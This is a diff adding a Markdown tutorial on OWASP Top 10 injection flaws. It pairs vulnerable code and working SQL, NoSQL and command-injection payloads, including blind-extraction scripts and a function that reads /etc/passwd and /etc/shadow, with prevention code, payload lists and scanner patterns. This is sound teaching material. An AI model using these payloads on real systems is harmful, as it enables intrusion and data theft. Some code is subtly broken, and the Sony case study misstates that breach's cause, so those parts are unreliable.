@@ -1,0 +1,779 @@
+---
+title: "OWASP Top 10 2021: A03 - Injection"
+description: "Comprehensive guide to injection vulnerabilities including SQL injection, NoSQL injection, command injection, and LDAP injection with exploitation and prevention techniques."
+author: "Yugesh Mekala"
+date: "2024-01-17"
+categories: [OWASP Top 10, Injection, SQL Injection, Command Injection, Web Security]
+page-layout: full
+title-block-banner: true
+---
+
+# OWASP Top 10 2021: A03 - Injection
+
+## Overview
+
+Injection vulnerabilities occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. Injection flaws are very prevalent, particularly in legacy code.
+
+## Types of Injection Attacks
+
+### 1. SQL Injection
+### 2. NoSQL Injection
+### 3. Command Injection
+### 4. LDAP Injection
+### 5. XPath Injection
+### 6. Expression Language Injection
+
+## SQL Injection
+
+### Understanding SQL Injection
+
+SQL injection occurs when user input is directly concatenated into SQL queries without proper sanitization.
+
+```python
+# VULNERABLE: Direct string concatenation
+def get_user_vulnerable(username, password):
+    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+    cursor.execute(query)
+    return cursor.fetchone()
+
+# Attack payload:
+# username: admin'--
+# password: anything
+# Resulting query: SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
+```
+
+### SQL Injection Exploitation Techniques
+
+#### 1. Authentication Bypass
+
+```sql
+-- Original query
+SELECT * FROM users WHERE username = 'admin' AND password = 'secret'
+
+-- Injection payload: ' OR '1'='1' --
+SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'secret'
+
+-- Result: Always returns true, bypassing authentication
+```
+
+#### 2. Union-Based SQL Injection
+
+```python
+# Vulnerable search function
+def search_products(category):
+    query = f"SELECT name, price FROM products WHERE category = '{category}'"
+    return execute_query(query)
+
+# Attack payload to extract user data
+# category: ' UNION SELECT username, password FROM users --
+
+# Resulting query:
+# SELECT name, price FROM products WHERE category = '' UNION SELECT username, password FROM users --'
+```
+
+#### 3. Boolean-Based Blind SQL Injection
+
+```python
+# Vulnerable login check
+def check_user_exists(username):
+    query = f"SELECT COUNT(*) FROM users WHERE username = '{username}'"
+    result = execute_query(query)
+    return result[0] > 0
+
+# Attack payloads for data extraction
+payloads = [
+    "admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--",
+    "admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'--",
+    # Continue until character is found
+]
+
+def extract_password():
+    password = ""
+    for position in range(1, 50):  # Assume max password length of 50
+        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
+            payload = f"admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{position},1)='{char}'--"
+            if check_user_exists(payload):
+                password += char
+                break
+    return password
+```
+
+#### 4. Time-Based Blind SQL Injection
+
+```python
+# Exploit using time delays
+def time_based_injection(payload):
+    start_time = time.time()
+    
+    # Inject payload that causes delay if condition is true
+    test_payload = f"admin'; IF (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') WAITFOR DELAY '00:00:05'--"
+    
+    check_user_exists(test_payload)
+    
+    end_time = time.time()
+    return (end_time - start_time) > 4  # If delay occurred, condition was true
+
+# Automated extraction
+def extract_data_time_based():
+    data = ""
+    for position in range(1, 100):
+        for char in string.ascii_lowercase + string.digits:
+            payload = f"admin'; IF (SUBSTRING((SELECT database()),{position},1)='{char}') WAITFOR DELAY '00:00:03'--"
+            if time_based_injection(payload):
+                data += char
+                print(f"Found character: {char}")
+                break
+        if not char:  # No more characters found
+            break
+    return data
+```
+
+### Advanced SQL Injection Techniques
+
+#### Error-Based SQL Injection
+
+```sql
+-- MySQL error-based extraction
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
+
+-- PostgreSQL error-based extraction
+' AND CAST((SELECT version()) AS int) --
+
+-- SQL Server error-based extraction
+' AND 1=CONVERT(int,(SELECT @@version)) --
+```
+
+#### Second-Order SQL Injection
+
+```python
+# First request: Store malicious payload
+def register_user(username, email):
+    # Payload stored in database: admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users--
+    query = f"INSERT INTO users (username, email) VALUES ('{username}', '{email}')"
+    execute_query(query)
+
+# Second request: Payload executes during data retrieval
+def get_user_profile(user_id):
+    # Vulnerable: Using stored username in query
+    query = f"SELECT * FROM profiles WHERE username = (SELECT username FROM users WHERE id = {user_id})"
+    return execute_query(query)
+```
+
+## NoSQL Injection
+
+### MongoDB Injection
+
+```javascript
+// VULNERABLE: Direct object construction
+app.post('/login', (req, res) => {
+    const { username, password } = req.body;
+    
+    // Vulnerable query construction
+    const user = db.collection('users').findOne({
+        username: username,
+        password: password
+    });
+});
+
+// Attack payload:
+// username: {"$ne": ""}
+// password: {"$ne": ""}
+// Results in: db.users.findOne({username: {"$ne": ""}, password: {"$ne": ""}})
+// This returns any user where username and password are not empty
+```
+
+### NoSQL Injection Exploitation
+
+```python
+# Python script for NoSQL injection testing
+import requests
+import json
+
+def test_nosql_injection(url):
+    # Authentication bypass payloads
+    payloads = [
+        {"username": {"$ne": ""}, "password": {"$ne": ""}},
+        {"username": {"$gt": ""}, "password": {"$gt": ""}},
+        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
+        {"username": {"$exists": True}, "password": {"$exists": True}}
+    ]
+    
+    for payload in payloads:
+        response = requests.post(url, json=payload)
+        if "success" in response.text.lower():
+            print(f"Successful injection with payload: {payload}")
+            return True
+    return False
+
+# Data extraction through NoSQL injection
+def extract_usernames(url):
+    usernames = []
+    for char in string.ascii_lowercase:
+        payload = {
+            "username": {"$regex": f"^{char}.*"},
+            "password": {"$ne": ""}
+        }
+        response = requests.post(url, json=payload)
+        if "success" in response.text.lower():
+            # Found username starting with this character
+            # Continue extraction...
+            usernames.append(extract_full_username(url, char))
+    return usernames
+```
+
+## Command Injection
+
+### OS Command Injection
+
+```python
+# VULNERABLE: Direct command execution
+import subprocess
+import os
+
+def ping_host(hostname):
+    # Dangerous: User input directly used in command
+    command = f"ping -c 4 {hostname}"
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    return result.stdout
+
+# Attack payload: 127.0.0.1; cat /etc/passwd
+# Resulting command: ping -c 4 127.0.0.1; cat /etc/passwd
+```
+
+### Command Injection Exploitation
+
+```python
+# Advanced command injection techniques
+def exploit_command_injection(url, parameter):
+    # Test for command injection
+    test_payloads = [
+        "; id",
+        "| id",
+        "&& id",
+        "|| id",
+        "`id`",
+        "$(id)"
+    ]
+    
+    for payload in test_payloads:
+        data = {parameter: f"127.0.0.1{payload}"}
+        response = requests.post(url, data=data)
+        
+        # Look for command output indicators
+        if any(keyword in response.text for keyword in ["uid=", "gid=", "groups="]):
+            print(f"Command injection found with payload: {payload}")
+            return payload
+    
+    return None
+
+# Data exfiltration through command injection
+def exfiltrate_data(url, parameter, injection_point):
+    commands = [
+        "cat /etc/passwd",
+        "cat /etc/shadow",
+        "ls -la /",
+        "env",
+        "ps aux"
+    ]
+    
+    for cmd in commands:
+        payload = f"127.0.0.1{injection_point}{cmd}"
+        data = {parameter: payload}
+        response = requests.post(url, data=data)
+        
+        print(f"Command: {cmd}")
+        print(f"Output: {response.text}")
+        print("-" * 50)
+```
+
+## Prevention Strategies
+
+### 1. SQL Injection Prevention
+
+#### Parameterized Queries (Prepared Statements)
+
+```python
+# SECURE: Using parameterized queries
+import sqlite3
+from sqlalchemy import text
+
+# SQLite with parameterized queries
+def get_user_secure(username, password):
+    query = "SELECT * FROM users WHERE username = ? AND password = ?"
+    cursor.execute(query, (username, password))
+    return cursor.fetchone()
+
+# SQLAlchemy with parameterized queries
+def search_products_secure(category, min_price):
+    query = text("SELECT name, price FROM products WHERE category = :category AND price >= :min_price")
+    result = db.session.execute(query, {"category": category, "min_price": min_price})
+    return result.fetchall()
+
+# Django ORM (automatically parameterized)
+from django.contrib.auth.models import User
+
+def get_user_django(username):
+    # Django ORM automatically parameterizes queries
+    return User.objects.filter(username=username).first()
+```
+
+#### Input Validation and Sanitization
+
+```python
+import re
+from sqlalchemy import text
+
+def validate_input(value, input_type):
+    """Validate input based on expected type"""
+    validators = {
+        'username': r'^[a-zA-Z0-9_]{3,20}$',
+        'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
+        'integer': r'^\d+$',
+        'alphanumeric': r'^[a-zA-Z0-9]+$'
+    }
+    
+    if input_type in validators:
+        return bool(re.match(validators[input_type], str(value)))
+    return False
+
+def secure_search(category, price_min):
+    # Validate inputs
+    if not validate_input(category, 'alphanumeric'):
+        raise ValueError("Invalid category format")
+    
+    if not validate_input(price_min, 'integer'):
+        raise ValueError("Invalid price format")
+    
+    # Use parameterized query
+    query = text("SELECT * FROM products WHERE category = :category AND price >= :price")
+    return db.session.execute(query, {"category": category, "price": int(price_min)})
+```
+
+#### Stored Procedures with Proper Implementation
+
+```sql
+-- SECURE: SQL Server stored procedure
+CREATE PROCEDURE GetUserByCredentials
+    @Username NVARCHAR(50),
+    @Password NVARCHAR(100)
+AS
+BEGIN
+    SET NOCOUNT ON;
+    
+    SELECT UserID, Username, Email, Role
+    FROM Users
+    WHERE Username = @Username AND PasswordHash = @Password;
+END
+
+-- Usage in Python
+def authenticate_user(username, password_hash):
+    cursor.execute("EXEC GetUserByCredentials ?, ?", (username, password_hash))
+    return cursor.fetchone()
+```
+
+### 2. NoSQL Injection Prevention
+
+```javascript
+// SECURE: Input validation for MongoDB
+const validator = require('validator');
+
+app.post('/login', (req, res) => {
+    const { username, password } = req.body;
+    
+    // Validate input types
+    if (typeof username !== 'string' || typeof password !== 'string') {
+        return res.status(400).json({ error: 'Invalid input type' });
+    }
+    
+    // Validate format
+    if (!validator.isAlphanumeric(username) || username.length > 50) {
+        return res.status(400).json({ error: 'Invalid username format' });
+    }
+    
+    // Use exact matching (no operators)
+    const user = db.collection('users').findOne({
+        username: username,
+        password: password
+    });
+    
+    if (user) {
+        res.json({ success: true, user: user });
+    } else {
+        res.status(401).json({ error: 'Invalid credentials' });
+    }
+});
+
+// Alternative: Use parameterized queries with MongoDB
+const MongoClient = require('mongodb').MongoClient;
+
+async function authenticateUser(username, password) {
+    const client = new MongoClient(connectionString);
+    
+    try {
+        await client.connect();
+        const db = client.db('myapp');
+        
+        // Safe query with explicit field matching
+        const user = await db.collection('users').findOne({
+            $and: [
+                { username: { $eq: username } },
+                { password: { $eq: password } }
+            ]
+        });
+        
+        return user;
+    } finally {
+        await client.close();
+    }
+}
+```
+
+### 3. Command Injection Prevention
+
+```python
+# SECURE: Command injection prevention
+import subprocess
+import shlex
+import re
+
+def safe_ping(hostname):
+    # Validate hostname format
+    if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
+        raise ValueError("Invalid hostname format")
+    
+    # Use subprocess with argument list (no shell=True)
+    try:
+        result = subprocess.run(
+            ['ping', '-c', '4', hostname],
+            capture_output=True,
+            text=True,
+            timeout=10,
+            check=False
+        )
+        return result.stdout
+    except subprocess.TimeoutExpired:
+        return "Ping timed out"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+# Alternative: Use shlex for shell escaping if shell is necessary
+def safe_command_with_shell(user_input):
+    # Escape user input
+    escaped_input = shlex.quote(user_input)
+    
+    # Construct command with escaped input
+    command = f"echo {escaped_input}"
+    
+    result = subprocess.run(
+        command,
+        shell=True,
+        capture_output=True,
+        text=True,
+        timeout=5
+    )
+    return result.stdout
+
+# Whitelist approach for command parameters
+ALLOWED_COMMANDS = {
+    'ping': {
+        'executable': '/bin/ping',
+        'max_args': 2,
+        'allowed_flags': ['-c', '-W']
+    },
+    'ls': {
+        'executable': '/bin/ls',
+        'max_args': 1,
+        'allowed_flags': ['-l', '-a']
+    }
+}
+
+def execute_whitelisted_command(command_name, args):
+    if command_name not in ALLOWED_COMMANDS:
+        raise ValueError(f"Command {command_name} not allowed")
+    
+    config = ALLOWED_COMMANDS[command_name]
+    
+    # Validate arguments
+    if len(args) > config['max_args']:
+        raise ValueError("Too many arguments")
+    
+    # Build safe command
+    cmd = [config['executable']] + args
+    
+    result = subprocess.run(
+        cmd,
+        capture_output=True,
+        text=True,
+        timeout=10
+    )
+    return result.stdout
+```
+
+### 4. LDAP Injection Prevention
+
+```python
+# SECURE: LDAP injection prevention
+import ldap
+import re
+
+def safe_ldap_search(username):
+    # Input validation
+    if not re.match(r'^[a-zA-Z0-9._-]+$', username):
+        raise ValueError("Invalid username format")
+    
+    # Escape LDAP special characters
+    escaped_username = ldap.filter.escape_filter_chars(username)
+    
+    # Construct safe filter
+    search_filter = f"(uid={escaped_username})"
+    
+    # Perform LDAP search
+    conn = ldap.initialize('ldap://localhost:389')
+    try:
+        results = conn.search_s(
+            'ou=users,dc=example,dc=com',
+            ldap.SCOPE_SUBTREE,
+            search_filter,
+            ['cn', 'mail']
+        )
+        return results
+    finally:
+        conn.unbind()
+
+# Custom LDAP escaping function
+def escape_ldap_filter(value):
+    """Escape special characters in LDAP filter values"""
+    escape_map = {
+        '*': '\\2a',
+        '(': '\\28',
+        ')': '\\29',
+        '\\': '\\5c',
+        '\x00': '\\00'
+    }
+    
+    escaped = ""
+    for char in value:
+        escaped += escape_map.get(char, char)
+    
+    return escaped
+```
+
+## Testing and Detection
+
+### 1. Automated Testing Tools
+
+```python
+# SQLMap automation script
+import subprocess
+import json
+
+def run_sqlmap_test(target_url, parameters):
+    """Run SQLMap against target with specified parameters"""
+    
+    sqlmap_cmd = [
+        'sqlmap',
+        '-u', target_url,
+        '--data', parameters,
+        '--batch',
+        '--level', '3',
+        '--risk', '2',
+        '--output-dir', './sqlmap_results'
+    ]
+    
+    try:
+        result = subprocess.run(sqlmap_cmd, capture_output=True, text=True, timeout=300)
+        return {
+            'status': 'completed',
+            'output': result.stdout,
+            'errors': result.stderr
+        }
+    except subprocess.TimeoutExpired:
+        return {'status': 'timeout', 'message': 'SQLMap test timed out'}
+    except Exception as e:
+        return {'status': 'error', 'message': str(e)}
+
+# Custom injection testing
+class InjectionTester:
+    def __init__(self, base_url):
+        self.base_url = base_url
+        self.session = requests.Session()
+    
+    def test_sql_injection(self, endpoint, parameters):
+        """Test for SQL injection vulnerabilities"""
+        sql_payloads = [
+            "'",
+            "' OR '1'='1",
+            "' AND 1=1--",
+            "' UNION SELECT 1,2,3--",
+            "'; WAITFOR DELAY '00:00:05'--"
+        ]
+        
+        results = []
+        for param_name, param_value in parameters.items():
+            for payload in sql_payloads:
+                test_params = parameters.copy()
+                test_params[param_name] = payload
+                
+                response = self.session.post(f"{self.base_url}/{endpoint}", data=test_params)
+                
+                # Check for SQL error messages
+                sql_errors = [
+                    "sql syntax",
+                    "mysql_fetch",
+                    "ORA-",
+                    "Microsoft OLE DB",
+                    "PostgreSQL query failed"
+                ]
+                
+                for error in sql_errors:
+                    if error.lower() in response.text.lower():
+                        results.append({
+                            'parameter': param_name,
+                            'payload': payload,
+                            'type': 'SQL Injection',
+                            'evidence': error
+                        })
+        
+        return results
+    
+    def test_command_injection(self, endpoint, parameters):
+        """Test for command injection vulnerabilities"""
+        cmd_payloads = [
+            "; id",
+            "| whoami",
+            "&& echo vulnerable",
+            "`id`",
+            "$(whoami)"
+        ]
+        
+        results = []
+        for param_name, param_value in parameters.items():
+            for payload in cmd_payloads:
+                test_params = parameters.copy()
+                test_params[param_name] = f"{param_value}{payload}"
+                
+                response = self.session.post(f"{self.base_url}/{endpoint}", data=test_params)
+                
+                # Check for command output
+                cmd_indicators = ["uid=", "gid=", "root", "administrator"]
+                
+                for indicator in cmd_indicators:
+                    if indicator in response.text.lower():
+                        results.append({
+                            'parameter': param_name,
+                            'payload': payload,
+                            'type': 'Command Injection',
+                            'evidence': indicator
+                        })
+        
+        return results
+```
+
+### 2. Static Code Analysis
+
+```python
+# Security code review patterns
+import ast
+import re
+
+class InjectionVulnerabilityScanner:
+    def __init__(self):
+        self.vulnerabilities = []
+    
+    def scan_sql_injection(self, code):
+        """Scan for potential SQL injection vulnerabilities"""
+        
+        # Pattern 1: String formatting in SQL queries
+        sql_format_patterns = [
+            r'execute\s*\(\s*["\'].*%.*["\']',
+            r'cursor\.execute\s*\(\s*f["\']',
+            r'query\s*=\s*f["\'].*SELECT.*{.*}.*["\']'
+        ]
+        
+        for pattern in sql_format_patterns:
+            matches = re.finditer(pattern, code, re.IGNORECASE | re.MULTILINE)
+            for match in matches:
+                self.vulnerabilities.append({
+                    'type': 'SQL Injection',
+                    'pattern': pattern,
+                    'location': match.span(),
+                    'severity': 'High'
+                })
+    
+    def scan_command_injection(self, code):
+        """Scan for potential command injection vulnerabilities"""
+        
+        cmd_patterns = [
+            r'subprocess\.run\s*\([^)]*shell\s*=\s*True',
+            r'os\.system\s*\(',
+            r'subprocess\.call\s*\([^)]*shell\s*=\s*True'
+        ]
+        
+        for pattern in cmd_patterns:
+            matches = re.finditer(pattern, code, re.IGNORECASE)
+            for match in matches:
+                self.vulnerabilities.append({
+                    'type': 'Command Injection',
+                    'pattern': pattern,
+                    'location': match.span(),
+                    'severity': 'High'
+                })
+    
+    def generate_report(self):
+        """Generate vulnerability report"""
+        report = {
+            'total_vulnerabilities': len(self.vulnerabilities),
+            'high_severity': len([v for v in self.vulnerabilities if v['severity'] == 'High']),
+            'vulnerabilities': self.vulnerabilities
+        }
+        return report
+
+# Usage
+scanner = InjectionVulnerabilityScanner()
+with open('app.py', 'r') as f:
+    code = f.read()
+
+scanner.scan_sql_injection(code)
+scanner.scan_command_injection(code)
+report = scanner.generate_report()
+print(json.dumps(report, indent=2))
+```
+
+## Real-World Case Studies
+
+### Case Study: Sony Pictures Hack (2014)
+
+**Vulnerability**: SQL injection in web applications
+**Impact**: Complete database compromise, confidential data theft
+**Root Cause**: Unvalidated user input in search functionality
+**Lessons Learned**:
+- Input validation must be comprehensive
+- Database permissions should be minimal
+- Regular security testing is essential
+
+### Case Study: TalkTalk Data Breach (2015)
+
+**Vulnerability**: SQL injection on customer portal
+**Impact**: 157,000 customers affected, £77 million cost
+**Root Cause**: Legacy code with concatenated SQL queries
+**Prevention**:
+- Code review and refactoring of legacy systems
+- Implementation of parameterized queries
+- Regular penetration testing
+
+## Conclusion
+
+Injection vulnerabilities remain critical because they:
+
+1. **Directly compromise data integrity**
+2. **Can lead to complete system takeover**
+3. **Are often found in legacy applications**
+4. **Can be easily exploited with minimal skills**
+
+Prevention requires a multi-layered approach combining secure coding practices, input validation, parameterized queries, and regular security testing.
+
+## References
+
+- [OWASP Top 10 2021 - A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)
+- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [OWASP Command Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
